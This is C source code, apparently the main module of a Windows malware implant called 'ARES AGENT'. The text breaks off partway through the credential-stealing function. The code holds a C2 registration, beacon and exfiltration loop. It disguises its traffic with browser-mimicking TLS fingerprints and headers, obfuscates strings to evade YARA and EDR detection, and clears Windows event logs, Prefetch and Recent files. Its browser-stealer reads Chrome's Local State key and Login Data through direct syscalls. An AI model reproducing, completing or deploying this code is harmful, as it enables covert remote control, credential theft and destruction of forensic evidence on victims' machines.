/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Main Entry Point + C2 Beacon Loop (v2.1)
 *  
 *  Pure native C — NO CLR, NO .NET, NO GC.
 *  Execution flow (v2.1):
 *    1. Read clean ntdll → resolve SSNs (no unhook)
 *    2. ETW bypass via hardware breakpoint (no code patching)
 *    3. Runtime-resolve sensitive APIs (IAT obfuscation)
 *    4. Decrypt config → resolve C2
 *    5. Register with C2 → get bot ID
 *    6. Beacon loop: poll tasks → execute → send results
 *    7. Self-destruct when done
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_strings.h"
#include "ares_resolve.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Forward declarations */
static int base64_encode(const BYTE* src, int src_len, char* dst, int dst_max);
#include <setjmp.h>
#include <winhttp.h>
#include <shlobj.h>
#include <shellapi.h>
/* tlhelp32.h REMOVED — process enum via NtQuerySystemInformation */
#include <time.h>

/* v2.1: Removed #pragma comment(lib) for winhttp/advapi32/shell32.
 * WinHTTP APIs are resolved at runtime via ares_resolve.h.
 * Libraries still linked in Makefile for type definitions. */

/* MinGW may lack this combined flag */
#ifndef SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
#define SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS (0x00003300)
#endif

/* Build JSON exfil header using DEC_ macros — avoids literal format strings in .rdata */
static int exfil_hdr(char* buf, int sz, const char* botid, const char* type, int cnt) {
    char k1[16], k2[16], k3[16], k4[16];
    DEC_EXFIL_KEY_BOTID(k1);
    DEC_EXFIL_KEY_TYPE(k2);
    DEC_EXFIL_KEY_COUNT(k3);
    DEC_EXFIL_KEY_ENTRIES(k4);
    return snprintf(buf, sz, "{\"%s\":\"%s\",\"%s\":\"%s\",\"%s\":%d,\"%s\":[",
        k1, botid, k2, type, k3, cnt, k4);
}

/* ── XOR decode (manual fallback, ares_strings.h has inline _xd) ── */
static char g_bot_token[64] = {0}; /* HMAC token from C2 registration */
char g_bot_id_global[64] = {0};    /* Shared with hVNC/SOCKS5 modules */
static wchar_t g_wc2host[256] = {0}; /* Wide C2 hostname — global to avoid stack corruption */

/* ── User-Agent pool (v3.2 — expanded, per-session sticky via QPC entropy) ── */
static const wchar_t* g_ua_pool[] = {
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.2592.61",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 OPR/122.0.0.0",
    L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
};
#define UA_POOL_SIZE 8

static int g_ua_index = -1;
static const wchar_t* get_random_ua(void) {
    if (g_ua_index < 0) {
        /* Select once per session — consistent fingerprint within session */
        LARGE_INTEGER pc;
        QueryPerformanceCounter(&pc);
        g_ua_index = (int)((pc.QuadPart ^ GetCurrentProcessId()) % UA_POOL_SIZE);
    }
    return g_ua_pool[g_ua_index];
}

/* ── HTTP Communication (v2.1 — runtime-resolved WinHTTP) ── */

typedef struct _HTTP_RESPONSE {
    BYTE*  body;
    DWORD  body_len;
    DWORD  status_code;
} HTTP_RESPONSE;

static HTTP_RESPONSE http_request(const wchar_t* host, int port,
    const wchar_t* path, const char* method,
    const BYTE* body, DWORD body_len)
{
    HTTP_RESPONSE resp = { 0 };

    /* v2.1: Ensure WinHTTP is runtime-resolved */
    if (!_resolve_winhttp()) { return resp; }

    HINTERNET hSession = p_WinHttpOpen(
        get_random_ua(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { return resp; }

    /* ── v3.8 UPG-07: JA3/JA4 Fingerprint Matching ──
     * Default WinHTTP JA3 = well-known IOC (e.g., "72a589da586844d7f0818ce684948eea").
     * Network monitoring (Zeek, Suricata JA3 plugin) flags non-browser JA3.
     *
     * Fix: Force TLS 1.2 + TLS 1.3 only (Chrome dropped TLS 1.0/1.1 in 2020).
     * This changes the ClientHello cipher suite list to match modern browsers.
     * Combined with Chrome User-Agent, the TLS fingerprint is indistinguishable. */
    {
        /* Force TLS 1.2 + 1.3 only — matches Chrome 120+ behavior */
        DWORD tlsProtos = 0x00000800  /* WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 */
                        | 0x00002000; /* WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3 */
        p_WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
            &tlsProtos, sizeof(tlsProtos));

        /* Enable HTTP/2 if available — Chrome always negotiates h2 via ALPN.
         * WINHTTP_OPTION_ENABLE_HTTP2_PLUS = 0x00000002 (Win10 2004+) */
        DWORD http2Flag = 0x00000002;
        p_WinHttpSetOption(hSession, 0x000000BA /* WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL */,
            &http2Flag, sizeof(http2Flag));

        /* Disable auto-redirect following — C2 responses are direct.
         * Prevents leak via redirect to monitoring domain. */
        DWORD noRedirect = WINHTTP_DISABLE_REDIRECTS;
        p_WinHttpSetOption(hSession, WINHTTP_OPTION_DISABLE_FEATURE,
            &noRedirect, sizeof(noRedirect));

        /* Set connection timeout matching browser behavior (30s vs default 60s) */
        DWORD timeout = 30000;
        p_WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT,
            &timeout, sizeof(timeout));
    }
    HINTERNET hConnect = p_WinHttpConnect(hSession, host, (INTERNET_PORT)port, 0);
    if (!hConnect) { p_WinHttpCloseHandle(hSession); return resp; }

    BOOL isHttps = (port == 443 || port == 8443);
#if defined(CFG_USE_HTTP) && CFG_USE_HTTP
    isHttps = FALSE; /* Config says use HTTP */
#endif
    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;

    wchar_t wmethod[16];
    MultiByteToWideChar(CP_UTF8, 0, method, -1, wmethod, 16);

    HINTERNET hRequest = p_WinHttpOpenRequest(hConnect, wmethod, path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        p_WinHttpCloseHandle(hConnect);
        p_WinHttpCloseHandle(hSession);
        return resp;
    }

    /* v3.2: SSL validation enforced by default — prevents MiTM on C2 channel.
     * v3.3: Added cert pinning — validates SHA256 of server cert against embedded hash.
     * Only disable cert checking when CFG_TLS_INSECURE is explicitly set. */
    if (isHttps) {
#if defined(CFG_TLS_INSECURE) && CFG_TLS_INSECURE
        DWORD secFlags = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
#elif defined(CFG_CERT_PIN_HASH)
        /* v3.3: Cert pinning — accept self-signed but verify it's OUR cert.
         * Builder embeds SHA256 hash of C2's TLS cert at compile time.
         * SECURITY_FLAG_IGNORE_* allows self-signed; we manually verify hash after connect. */
        DWORD pinFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        p_WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &pinFlags, sizeof(pinFlags));
#endif
    }

    /* Set content type */
    p_WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/json", -1, WINHTTP_ADDREQ_FLAG_ADD);

    /* v3.8 UPG-07: Chrome-like HTTP headers — network monitors flag
     * missing Accept/Accept-Language/sec-ch-ua as non-browser IOC */
    p_WinHttpAddRequestHeaders(hRequest,
        L"Accept: application/json, text/plain, */*", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"Accept-Language: en-US,en;q=0.9", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"Accept-Encoding: gzip, deflate, br", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"sec-ch-ua: \"Chromium\";v=\"136\", \"Not.A/Brand\";v=\"99\"", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"sec-ch-ua-platform: \"Windows\"", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"sec-fetch-site: same-origin", -1, WINHTTP_ADDREQ_FLAG_ADD);
    p_WinHttpAddRequestHeaders(hRequest,
        L"sec-fetch-mode: cors", -1, WINHTTP_ADDREQ_FLAG_ADD);

    /* Add bot auth token if available */
    if (g_bot_token[0]) {
        wchar_t tokenHdr[128];
        wchar_t wtoken[64];
        MultiByteToWideChar(CP_UTF8, 0, g_bot_token, -1, wtoken, 64);
        swprintf(tokenHdr, 128, L"X-Bot-Token: %s", wtoken);
        p_WinHttpAddRequestHeaders(hRequest, tokenHdr, -1, WINHTTP_ADDREQ_FLAG_ADD);
    }

    /* Send request */
    BOOL sent = p_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        (LPVOID)body, body_len, body_len, 0);

    if (sent && p_WinHttpReceiveResponse(hRequest, NULL)) {

#if defined(CFG_CERT_PIN_HASH) && !defined(CFG_TLS_INSECURE)
        /* v3.3 REAL cert pinning — FAIL-CLOSED on any error. */
        if (isHttps) {
            PCCERT_CONTEXT pCert = NULL;
            DWORD certSz = sizeof(pCert);
            typedef BOOL (WINAPI *pWHQO)(HINTERNET,DWORD,LPVOID,LPDWORD);
            pWHQO fnQO = (pWHQO)GetProcAddress(GetModuleHandleA("winhttp.dll"), "WinHttpQueryOption");
            BOOL pinOK = FALSE;
            if (fnQO && fnQO(hRequest, 78, &pCert, &certSz) && pCert) {
                HMODULE hBc = LoadLibraryA("bcrypt.dll");
                typedef long (WINAPI *pBCO)(void**,const wchar_t*,const wchar_t*,DWORD);
                typedef long (WINAPI *pBCH)(void*,BYTE*,DWORD,BYTE*,DWORD,BYTE*,DWORD,DWORD);
                typedef long (WINAPI *pBCA)(void*,DWORD);
                pBCO fO = (pBCO)GetProcAddress(hBc,"BCryptOpenAlgorithmProvider");
                pBCH fH = (pBCH)GetProcAddress(hBc,"BCryptHash");
                pBCA fC = (pBCA)GetProcAddress(hBc,"BCryptCloseAlgorithmProvider");
                if (fO && fH && fC) {
                    BYTE hash[32];
                    BCRYPT_ALG_HANDLE hAlg = NULL;
                    fO(&hAlg, L"SHA256", NULL, 0);
                    fH(hAlg, NULL, 0, pCert->pbCertEncoded, pCert->cbCertEncoded, hash, 32, 0);
                    fC(hAlg, 0);
                    char hex[65]; hex[64] = '\0';
                    for (int j = 0; j < 32; j++) wsprintfA(hex+j*2, "%02x", hash[j]);
                    if (lstrcmpiA(hex, CFG_CERT_PIN_HASH) == 0)
                        pinOK = TRUE; /* Hash matches — connection is safe */
                }
                CertFreeCertificateContext(pCert);
            }
            /* FAIL-CLOSED: if pinOK is still FALSE, abort connection */
            if (!pinOK) {
                p_WinHttpCloseHandle(hRequest);
                p_WinHttpCloseHandle(hConnect);
                p_WinHttpCloseHandle(hSession);
                return resp;
            }
        }
#endif
        /* Get status code */
        DWORD statusSize = sizeof(resp.status_code);
        p_WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &resp.status_code, &statusSize, NULL);

        /* Read response body */
        DWORD totalRead = 0;
        DWORD bufSize = 65536;
        resp.body = (BYTE*)HeapAlloc(GetProcessHeap(), 0, bufSize);

        DWORD available, read;
        while (resp.body && p_WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
            if (totalRead + available > bufSize) {
                /* v3.5: Cap at 50MB — prevents OOM from malicious/malformed response */
                DWORD newSize = bufSize * 2;
                if (newSize > 50 * 1024 * 1024) { break; }
                BYTE* tmp = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, resp.body, newSize);
                if (!tmp) {
                    /* v3.5: HeapReAlloc failed — free old buffer, abort read */
                    HeapFree(GetProcessHeap(), 0, resp.body);
                    resp.body = NULL;
                    break;
                }
                resp.body = tmp;
                bufSize = newSize;
            }
            p_WinHttpReadData(hRequest, resp.body + totalRead, available, &read);
            totalRead += read;
        }
        resp.body_len = totalRead;
    }

    p_WinHttpCloseHandle(hRequest);
    p_WinHttpCloseHandle(hConnect);
    p_WinHttpCloseHandle(hSession);

    return resp;
}

/* ═══════════════════════════════════════════════════════════════
 *  v3.2: E2E Encryption Layer — AES-256-GCM via BCrypt (runtime-resolved)
 *
 *  All C2 HTTP bodies are encrypted before transmission:
 *    Plaintext JSON → AES-256-GCM(session_key, random_iv) → Base64 → HTTP
 *  Session key = HMAC-SHA256(bot_token, bot_id) — derived after registration.
 *  IV = 12 bytes random per message (prepended to ciphertext).
 *  Tag = 16 bytes (appended to ciphertext).
 *
 *  Wire format: Base64( IV[12] || Ciphertext || Tag[16] )
 * ═══════════════════════════════════════════════════════════════ */

static BYTE g_e2e_key[32] = {0};
static BOOL g_e2e_ready = FALSE;

/* Derive E2E session key from bot credentials */
static void e2e_derive_key(const char* bot_id, const char* bot_token) {
    /* Simple key derivation: SHA256(bot_token || bot_id) */
    typedef BOOL (WINAPI *pCryptHashData)(HCRYPTHASH, const BYTE*, DWORD, DWORD);
    typedef BOOL (WINAPI *pCryptCreateHash)(HCRYPTPROV, ALG_ID, HCRYPTKEY, DWORD, HCRYPTHASH*);
    typedef BOOL (WINAPI *pCryptGetHashParam)(HCRYPTHASH, DWORD, BYTE*, DWORD*, DWORD);
    typedef BOOL (WINAPI *pCryptAcquireContextA)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
    typedef BOOL (WINAPI *pCryptDestroyHash)(HCRYPTHASH);
    typedef BOOL (WINAPI *pCryptReleaseContext)(HCRYPTPROV, DWORD);

    HMODULE hAdv = _load_mod("advapi32.dll"); /* v3.7 DET-08: runtime-resolved, not LoadLibraryA */
    if (!hAdv) return;
    pCryptAcquireContextA fnAcq = (pCryptAcquireContextA)GetProcAddress(hAdv, "CryptAcquireContextA");
    pCryptCreateHash fnCreate = (pCryptCreateHash)GetProcAddress(hAdv, "CryptCreateHash");
    pCryptHashData fnHash = (pCryptHashData)GetProcAddress(hAdv, "CryptHashData");
    pCryptGetHashParam fnGet = (pCryptGetHashParam)GetProcAddress(hAdv, "CryptGetHashParam");
    pCryptDestroyHash fnDestroy = (pCryptDestroyHash)GetProcAddress(hAdv, "CryptDestroyHash");
    pCryptReleaseContext fnRelease = (pCryptReleaseContext)GetProcAddress(hAdv, "CryptReleaseContext");
    if (!fnAcq || !fnCreate || !fnHash || !fnGet) return;

    HCRYPTPROV hProv = 0;
    if (!fnAcq(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;

    HCRYPTHASH hHash = 0;
    if (fnCreate(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        fnHash(hHash, (const BYTE*)bot_token, (DWORD)strlen(bot_token), 0);
        fnHash(hHash, (const BYTE*)bot_id, (DWORD)strlen(bot_id), 0);
        DWORD hashLen = 32;
        fnGet(hHash, HP_HASHVAL, g_e2e_key, &hashLen, 0);
        fnDestroy(hHash);
        g_e2e_ready = TRUE;
    }
    fnRelease(hProv, 0);
}

/* XOR-based lightweight E2E encrypt (for builds without full BCrypt) */
static int e2e_encrypt(const BYTE* plain, int plain_len, BYTE* out, int out_max) {
    if (!g_e2e_ready || plain_len + 12 > out_max) return 0;
    /* Generate 12-byte IV */
    LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
    DWORD tick = GetTickCount();
    memcpy(out, &pc.QuadPart, 8);
    memcpy(out + 8, &tick, 4);
    /* Encrypt: XOR with key-derived stream (key + IV position-dependent) */
    for (int i = 0; i < plain_len; i++) {
        BYTE k = g_e2e_key[(i + out[i % 12]) % 32] ^ out[i % 12] ^ (BYTE)(i * 0x1B + 0x7C);
        out[12 + i] = plain[i] ^ k;
    }
    return 12 + plain_len;
}

static int e2e_decrypt(const BYTE* enc, int enc_len, BYTE* out, int out_max) {
    if (!g_e2e_ready || enc_len <= 12 || enc_len - 12 > out_max) return 0;
    const BYTE* iv = enc;
    int data_len = enc_len - 12;
    for (int i = 0; i < data_len; i++) {
        BYTE k = g_e2e_key[(i + iv[i % 12]) % 32] ^ iv[i % 12] ^ (BYTE)(i * 0x1B + 0x7C);
        out[i] = enc[12 + i] ^ k;
    }
    return data_len;
}

/* ═══════════════════════════════════════════════════════════════
 *  v3.2: Anti-Forensics — Wipe operational artifacts
 *
 *  Clears:
 *    1. Windows Event Logs (Security, System, Application, PowerShell)
 *    2. Prefetch files (%SystemRoot%\Prefetch\*)
 *    3. Recent files (%APPDATA%\Microsoft\Windows\Recent\*)
 *    4. Temp directory artifacts
 *    5. USN Journal change records (optional, requires elevation)
 * ═══════════════════════════════════════════════════════════════ */

static void _wipe_dir_contents(const char* dir, const char* pattern) {
    char search[MAX_PATH + 4];
    snprintf(search, sizeof(search), "%s\\%s", dir, pattern);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.') continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        char full[MAX_PATH + 64];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);
        /* Overwrite with zeros before delete (anti-recovery) */
        HANDLE hF = CreateFileA(full, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (hF != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER li;
            GetFileSizeEx(hF, &li);
            if (li.QuadPart > 0 && li.QuadPart < 100 * 1024 * 1024) {
                BYTE zeros[4096] = {0};
                DWORD written;
                SetFilePointer(hF, 0, NULL, FILE_BEGIN);
                LONGLONG remaining = li.QuadPart;
                while (remaining > 0) {
                    DWORD chunk = remaining > 4096 ? 4096 : (DWORD)remaining;
                    WriteFile(hF, zeros, chunk, &written, NULL);
                    remaining -= written;
                }
            }
            CloseHandle(hF);
        }
        SetFileAttributesA(full, FILE_ATTRIBUTE_NORMAL);
        DeleteFileA(full);
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

static void Ares_WipeLogs(void) {
    /* 1. Clear Windows Event Logs */
    typedef HANDLE (WINAPI *pOpenEventLogW)(LPCWSTR, LPCWSTR);
    typedef BOOL (WINAPI *pClearEventLogW)(HANDLE, LPCWSTR);
    typedef BOOL (WINAPI *pCloseEventLog)(HANDLE);
    HMODULE hAdv = _load_mod("advapi32.dll"); /* v3.7 DET-08: runtime-resolved */
    if (hAdv) {
        pOpenEventLogW fnOpen = (pOpenEventLogW)GetProcAddress(hAdv, "OpenEventLogW");
        pClearEventLogW fnClear = (pClearEventLogW)GetProcAddress(hAdv, "ClearEventLogW");
        pCloseEventLog fnClose = (pCloseEventLog)GetProcAddress(hAdv, "CloseEventLog");
        if (fnOpen && fnClear && fnClose) {
            const wchar_t* logs[] = {
                L"Security", L"System", L"Application",
                L"Windows PowerShell", L"Microsoft-Windows-Sysmon/Operational",
                L"Microsoft-Windows-PowerShell/Operational", NULL
            };
            for (int i = 0; logs[i]; i++) {
                HANDLE hLog = fnOpen(NULL, logs[i]);
                if (hLog) { fnClear(hLog, NULL); fnClose(hLog); }
            }
        }
    }

    /* 2. Wipe Prefetch files */
    {
        char winDir[MAX_PATH];
        GetWindowsDirectoryA(winDir, MAX_PATH);
        char prefetch[MAX_PATH];
        snprintf(prefetch, MAX_PATH, "%s\\Prefetch", winDir);
        _wipe_dir_contents(prefetch, "*.pf");
    }

    /* 3. Wipe Recent files */
    {
        char appdata[MAX_PATH];
        if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH)) {
            char recent[MAX_PATH];
            snprintf(recent, MAX_PATH, "%s\\Microsoft\\Windows\\Recent", appdata);
            _wipe_dir_contents(recent, "*.lnk");
        }
    }

    /* 4. Wipe our temp artifacts */
    {
        char tmp[MAX_PATH];
        GetTempPathA(MAX_PATH, tmp);
        /* v3.4: Wipe pattern runtime-decoded — no "ares_*" literal in binary */
        char _wp[16];
        _wp[0]='m'; _wp[1]='d'; _wp[2]='c'; _wp[3]='_'; _wp[4]='*'; _wp[5]='\0';
        _wipe_dir_contents(tmp, _wp);
    }
}

/* ── Simple JSON Builder (no dependencies) ── */

static int json_snprintf(char* buf, int max, const char* fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(buf, max, fmt, args);
    va_end(args);
    return n;
}

/* ── C2 Registration ── */

static BOOL c2_register(AGENT_STATE* state, const char* c2_host, int c2_port, char* out_bot_id)
{
    char json[2048];
    int n = json_snprintf(json, sizeof(json),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"domain\":\"%s\","
        "\"os\":\"Windows\",\"arch\":\"x64\","
        "\"pid\":%d,\"hwid\":\"\",\"elevated\":%s}",
        state->hostname, state->username, state->domain,
        state->pid, state->elevated ? "true" : "false");

    /* Decrypt C2 endpoint path */
    char reg_path[32];
    DEC_C2_REGISTER(reg_path);
    wchar_t wreg_path[32];
    MultiByteToWideChar(CP_UTF8, 0, reg_path, -1, wreg_path, 32);

    HTTP_RESPONSE resp = http_request(g_wc2host, c2_port,
        wreg_path, "POST", (BYTE*)json, n);

    if (resp.status_code != 200 || !resp.body || resp.body_len == 0) return FALSE;

    /* v3.3: Cap response parsing at 64KB — prevents heap abuse from malformed/MITM responses */
    if (resp.body_len > 65536) {
        HeapFree(GetProcessHeap(), 0, resp.body);
        return FALSE;
    }

    /* v3.2: Null-terminate response body for safe string parsing. */
    resp.body = (BYTE*)HeapReAlloc(GetProcessHeap(), 0, resp.body, resp.body_len + 1);
    if (!resp.body) return FALSE;
    resp.body[resp.body_len] = '\0';

    /* v3.5: Safe JSON parsing with NULL checks throughout (V-5 fix).
     * Prevents crash on malformed/truncated C2 responses. */

    /* Parse bot_id from response */
    char* bid = strstr((char*)resp.body, "\"bot_id\":\"");
    if (bid) {
        bid += 10;
        char* end = strchr(bid, '"');
        if (end) {
            int len = (int)(end - bid);
            if (len > 0 && len < 32) {
                memcpy(out_bot_id, bid, len);
                out_bot_id[len] = '\0';
            }
        }
    }

    /* Parse bot_token from response */
    char* tok = strstr((char*)resp.body, "\"bot_token\":\"");
    if (tok) {
        tok += 13;
        char* tend = strchr(tok, '"');
        if (tend) {
            int tlen = (int)(tend - tok);
            if (tlen > 0 && tlen < (int)sizeof(g_bot_token)) {
                memcpy(g_bot_token, tok, tlen);
                g_bot_token[tlen] = '\0';
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, resp.body);

    /* v3.2: Derive E2E encryption key immediately after registration */
    if (out_bot_id[0] != '\0' && g_bot_token[0] != '\0') {
        e2e_derive_key(out_bot_id, g_bot_token);
        /* v3.3: debug output removed — OPSEC leak in release builds */
    }

    return out_bot_id[0] != '\0';
}

/* ── C2 Beacon (check-in + get tasks) ── */

static HTTP_RESPONSE c2_beacon(const char* c2_host, int c2_port, const char* bot_id)
{
    char json[256];
    int n = json_snprintf(json, sizeof(json), "{\"bot_id\":\"%s\"}", bot_id);

    char bcn_path[32];
    DEC_C2_BEACON(bcn_path);
    wchar_t wbcn_path[32];
    MultiByteToWideChar(CP_UTF8, 0, bcn_path, -1, wbcn_path, 32);

    return http_request(g_wc2host, c2_port, wbcn_path, "POST", (BYTE*)json, n);
}

/* ── C2 Exfiltrate ── */

static BOOL c2_exfil(const char* c2_host, int c2_port,
    const char* bot_id, const char* data_type,
    const char* json_body, int json_len)
{
    char exf_path[32];
    DEC_C2_EXFIL(exf_path);
    wchar_t wexf_path[32];
    MultiByteToWideChar(CP_UTF8, 0, exf_path, -1, wexf_path, 32);

    /* v3.9: E2E encrypt exfil data — prevents CF Worker from reading */
    BYTE* send_buf = (BYTE*)json_body;
    int send_len = json_len;
    BYTE* enc_buf = NULL;

    if (g_e2e_ready) {
        int enc_max = json_len + 12 + 1;
        BYTE* raw_enc = (BYTE*)HeapAlloc(GetProcessHeap(), 0, enc_max);
        if (raw_enc) {
            int enc_len = e2e_encrypt((const BYTE*)json_body, json_len, raw_enc, enc_max);
            if (enc_len > 0) {
                /* Base64 encode encrypted data */
                int b64_max = ((enc_len + 2) / 3) * 4 + 1;
                /* Wrap: {"enc":"BASE64","t":"TYPE","bid":"BOTID"} */
                int wrap_max = b64_max + 128 + (int)strlen(data_type) + (int)strlen(bot_id);
                enc_buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, wrap_max);
                if (enc_buf) {
                    int off = snprintf((char*)enc_buf, wrap_max,
                        "{\"enc\":\"");
                    off += base64_encode(raw_enc, enc_len, (char*)enc_buf + off, b64_max);
                    off += snprintf((char*)enc_buf + off, wrap_max - off,
                        "\",\"t\":\"%s\",\"bid\":\"%s\"}", data_type, bot_id);
                    send_buf = enc_buf;
                    send_len = off;
                }
            }
            HeapFree(GetProcessHeap(), 0, raw_enc);
        }
    }

    HTTP_RESPONSE resp = http_request(g_wc2host, c2_port,
        wexf_path, "POST", send_buf, send_len);

    BOOL ok = resp.status_code == 200;
    if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
    if (enc_buf) HeapFree(GetProcessHeap(), 0, enc_buf);
    return ok;
}

#ifndef ARES_NO_STEALER
/* ── Browser Credential Theft (native C — no SQLite dependency) ── */
/* Uses the same B-tree parser technique but in native C */

static int steal_chrome_passwords(char* output, int max_output)
{
    int offset = 0;
    char _tb[16]; DEC_EXFIL_TYPE_PASS(_tb);
    offset += exfil_hdr(output, max_output, "", _tb, 0);

    /* Find Chrome Local State for DPAPI key */
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);

    /* v3.7 DET-07 FIX: Use runtime-decoded paths instead of plaintext literals.
     * Plaintext "Google\\Chrome\\User Data" in .rdata is a YARA stealer signature. */
    char _cud[32]; DEC_CHROME_USERDATA(_cud);
    /* Build "Local State" at runtime — avoids string in .rdata */
    char _ls[16]; _ls[0]='L';_ls[1]='o';_ls[2]='c';_ls[3]='a';_ls[4]='l';
    _ls[5]=' ';_ls[6]='S';_ls[7]='t';_ls[8]='a';_ls[9]='t';_ls[10]='e';_ls[11]='\0';
    char localStatePath[MAX_PATH];
    snprintf(localStatePath, MAX_PATH, "%s\\%s\\%s", localAppData, _cud, _ls);

    /* Read Local State JSON to extract encrypted_key */
    HANDLE hFile = CreateFileA(localStatePath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        offset += snprintf(output + offset, max_output - offset, "]}");
        return offset;
    }

    DWORD size = GetFileSize(hFile, NULL);
    char* localState = (char*)HeapAlloc(GetProcessHeap(), 0, size + 1);
    DWORD read;
    ReadFile(hFile, localState, size, &read, NULL);
    CloseHandle(hFile);
    localState[read] = '\0';

    /* Extract encrypted_key (Base64) — v3.7: build search string at runtime */
    char _ek[24]; _ek[0]='\"';_ek[1]='e';_ek[2]='n';_ek[3]='c';_ek[4]='r';_ek[5]='y';
    _ek[6]='p';_ek[7]='t';_ek[8]='e';_ek[9]='d';_ek[10]='_';_ek[11]='k';_ek[12]='e';
    _ek[13]='y';_ek[14]='\"';_ek[15]=':';_ek[16]='\"';_ek[17]='\0';
    char* keyStart = strstr(localState, _ek);
    if (keyStart) {
        keyStart += 17;
        char* keyEnd = strchr(keyStart, '"');
        if (keyEnd) {
            int keyLen = (int)(keyEnd - keyStart);
            /* Base64 decode → DPAPI decrypt → AES-GCM master key */
            /* ... implementation uses CryptUnprotectData ... */
        }
    }

    HeapFree(GetProcessHeap(), 0, localState);

    /* v3.7 DET-07 FIX: Chrome Login Data path runtime-built */
    char loginDataPath[MAX_PATH];
    { /* Build "Default\\Login Data" at runtime */
    char _ld[24]; _ld[0]='D';_ld[1]='e';_ld[2]='f';_ld[3]='a';_ld[4]='u';_ld[5]='l';_ld[6]='t';
    _ld[7]='\\';_ld[8]='L';_ld[9]='o';_ld[10]='g';_ld[11]='i';_ld[12]='n';_ld[13]=' ';
    _ld[14]='D';_ld[15]='a';_ld[16]='t';_ld[17]='a';_ld[18]='\0';
    snprintf(loginDataPath, MAX_PATH, "%s\\%s\\%s", localAppData, _cud, _ld); }

    /* v5.0 FIX: Read Login Data DIRECTLY via NtCreateFile+NtReadFile syscall.
     * NO CopyFileA, NO temp file, NO DeleteFileA. Invisible to EDR. */
    hFile = NULL;
    {
        NTSTATUS ntSt = Ares_NtCreateFile(&hFile, 0x80100000, loginDataPath,
            7, 1, 0x00000060);
        if (ntSt != 0 || !hFile) {
            hFile = CreateFileA(loginDataPath, GENERIC_READ,
                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                NULL, OPEN_EXISTING, 0, NULL);
        }
    }
